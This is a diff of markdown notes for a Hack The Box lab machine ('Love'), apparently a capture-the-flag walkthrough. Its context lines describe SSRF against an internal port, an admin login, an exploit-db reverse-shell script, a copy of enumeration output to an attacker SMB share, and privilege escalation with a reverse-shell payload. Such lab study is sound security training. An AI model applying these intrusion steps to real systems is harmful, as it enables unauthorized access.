@@ -9,69 +9,69 @@
 - I'm not sure what to test at this point, but I suspect it has something to do with the PHP and maybe some MySQL stuff. Injection maybe? Maybe not, I just tested with sqlmap and nothing...
 - After running my "lazy" nmap scan again, I found some interesting certificate information...
 
-![3acc666a981d886335699238d5c7ec92.png](../../_resources/3acc666a981d886335699238d5c7ec92-1.png)
+![[3acc666a981d886335699238d5c7ec92-1.png]]
 
 - ...and added a line to /etc/hosts for the classic local DNS config.
 
-![3cd7db4d724f8ec98fe978c6113d6bef.png](../../_resources/3cd7db4d724f8ec98fe978c6113d6bef-1.png)
+![[3cd7db4d724f8ec98fe978c6113d6bef-1.png]]
 
 - Interestingly, love.htb/admin/index.php seems to be an admin login (username is admin? different from the normal voter login). When trying username "admin", I get "Incorrect password", but when trying other usernames, I get "Cannot find account with the username"
 
 - Also interestingly, when I visited love.htb/admin/includes (LISTABLE directory), I saw errors pertaining to "omrs" (Online Marriage Registration System???) Considering the machine is called "love" this is pretty suspicious. It turns out that there are known exploits for OMRS on exploit-db and Github, too.
 
-![b30c33819764bbf89b0b4449773258ae.png](../../_resources/b30c33819764bbf89b0b4449773258ae-1.png)
+![[b30c33819764bbf89b0b4449773258ae-1.png]]
 
 - Seems like I will need admin access first...
 - Can I access the MySQL database using the staging.love.htb/beta.php web app? 
 - Is this some sort of SSRF? 
 - It turns out it is an SSRF attack using the staging.love.htb/beta.php app. From nmap results, we can see that port 5000 is running a webpage of some sort. We can't access it externally (hence the 403 Forbidden), but we can access it using the beta.php app because it will create an internal request to the port.
 
-![bde1ff1515d53b41bde619301877352f.png](../../_resources/bde1ff1515d53b41bde619301877352f-1.png)
+![[bde1ff1515d53b41bde619301877352f-1.png]]
 
-![7aa65090ea37a8c47242786a4fa8fa6e.png](../../_resources/7aa65090ea37a8c47242786a4fa8fa6e-1.png)
+![[7aa65090ea37a8c47242786a4fa8fa6e-1.png]]
 
 - Now we use the creds using the love.htb/admin portal found earlier.
 
-![34af597d089984676eb0f33c6e2c9cdc.png](../../_resources/34af597d089984676eb0f33c6e2c9cdc-1.png)
+![[34af597d089984676eb0f33c6e2c9cdc-1.png]]
 
-![d6b22e638e0c10cbe60ffb107458ca5f.png](../../_resources/d6b22e638e0c10cbe60ffb107458ca5f-1.png)
+![[d6b22e638e0c10cbe60ffb107458ca5f-1.png]]
 
 - There were already some voters in the system, and they seem to have hashes as their passwords... (though this may be tracks from other players on this same HTB machine...)
 
-![d36343a6bb9ac4ecb314b1dd9a93b5f6.png](../../_resources/d36343a6bb9ac4ecb314b1dd9a93b5f6-1.png)
+![[d36343a6bb9ac4ecb314b1dd9a93b5f6-1.png]]
 
 - After a quick Google search regarding the Voting System PHP/MySQL webapp, I was able to find a couple of exploits that looked useful for gaining a shell. One in particular caught my eye (using searchsploit): 49445.py from exploit-db
 
-![0c56943f9744d55377356e8324cb0987.png](../../_resources/0c56943f9744d55377356e8324cb0987-1.png)
+![[0c56943f9744d55377356e8324cb0987-1.png]]
 
-![adaf2ea5a8418f6c4cc6ce86a8d95aa5.png](../../_resources/adaf2ea5a8418f6c4cc6ce86a8d95aa5-1.png)
+![[adaf2ea5a8418f6c4cc6ce86a8d95aa5-1.png]]
 
 - The exploit seems to open a reverse shell, but we need to modify the variables and some of the URLs to match the structure on this particular server. For example, the `/votesystem/admin/index.php` needs to be changed to just `/admin/index.php` (and similarly for the rest). 
 
-![6efbd87dbf9946c61662f53b45ab918e.png](../../_resources/6efbd87dbf9946c61662f53b45ab918e-1.png)
+![[6efbd87dbf9946c61662f53b45ab918e-1.png]]
 
 - Note: you need to figure out your IP from the HTB VPN connection, not just your normal IP address. For me it is on the tun0 interface:
 
-![003cce35797929306557f068b313869a.png](../../_resources/003cce35797929306557f068b313869a-1.png)
+![[003cce35797929306557f068b313869a-1.png]]
 
-![f2fedceb356cf22a07ed0fd32bf3d3d7.png](../../_resources/f2fedceb356cf22a07ed0fd32bf3d3d7-1.png)
+![[f2fedceb356cf22a07ed0fd32bf3d3d7-1.png]]
 
 - Now, start netcat to listen on Kali for the reverse shell and run the exploit!
 
-![f5bf124d716aaf5775a0cf0d7ec0c83c.png](../../_resources/f5bf124d716aaf5775a0cf0d7ec0c83c-1.png)
+![[f5bf124d716aaf5775a0cf0d7ec0c83c-1.png]]
 
-![689e8a8dcbee9748193362f6efcaeefa.png](../../_resources/689e8a8dcbee9748193362f6efcaeefa-1.png)
+![[689e8a8dcbee9748193362f6efcaeefa-1.png]]
 
-![95ddfa6cfd962d892682263119a9d1b0.png](../../_resources/95ddfa6cfd962d892682263119a9d1b0-1.png)
+![[95ddfa6cfd962d892682263119a9d1b0-1.png]]
 
 - The user flag is in the typical spot for HTB machines (just some user's folder)
 
-![24dac5070871cd807ea3fd44f86b549d.png](../../_resources/24dac5070871cd807ea3fd44f86b549d-1.png)
+![[24dac5070871cd807ea3fd44f86b549d-1.png]]
 
 - Next step is looking for privilege escalation methods on the Windows machine.
 - But first, some enumeration on stuff like the architecture...
 
-![3908c3bf18076728736db71e34316f21.png](../../_resources/3908c3bf18076728736db71e34316f21-1.png)
+![[3908c3bf18076728736db71e34316f21-1.png]]
 
 - Not sure why, but WinPEAS is not cooperating with me. It's not running at all in the images directory...
 
@@ -220,22 +220,22 @@ C:\xampp\htdocs\omrs\images> copy peas.txt \\10.10.14.129\MYSHARE
 - To read the results in color, I used `less -R`
 - Suspicious lines found were: 
 
-![3df865114c7f329a059cd09e1ce7856f.png](../../_resources/3df865114c7f329a059cd09e1ce7856f-1.png)
+![[3df865114c7f329a059cd09e1ce7856f-1.png]]
 
 - Turns out there is an easy payload for privilege escalation. This just creates a reverse shell instance. 
 
-![da2f1f5e80588493a52131b0c2737361.png](../../_resources/da2f1f5e80588493a52131b0c2737361-1.png)
+![[da2f1f5e80588493a52131b0c2737361-1.png]]
 
 - Listening for the reverse shell on Kali
 
-![9470e4c6fae646c8b9ccb450dba4a507.png](../../_resources/9470e4c6fae646c8b9ccb450dba4a507-1.png)
+![[9470e4c6fae646c8b9ccb450dba4a507-1.png]]
 
 - Tranferring the payload on the target machine and installing it
 
-![f418c9b5735d23936b7049a91af47bb5.png](../../_resources/f418c9b5735d23936b7049a91af47bb5-1.png)
+![[f418c9b5735d23936b7049a91af47bb5-1.png]]
 
 - Success!
 
-![0124671bc00b2d2d7c690214d581d270.png](../../_resources/0124671bc00b2d2d7c690214d581d270-1.png)
+![[0124671bc00b2d2d7c690214d581d270-1.png]]
 
-![374c1f84c9be28a6a9d9fe4e8349dcaf.png](../../_resources/374c1f84c9be28a6a9d9fe4e8349dcaf-1.png)
+![[374c1f84c9be28a6a9d9fe4e8349dcaf-1.png]]
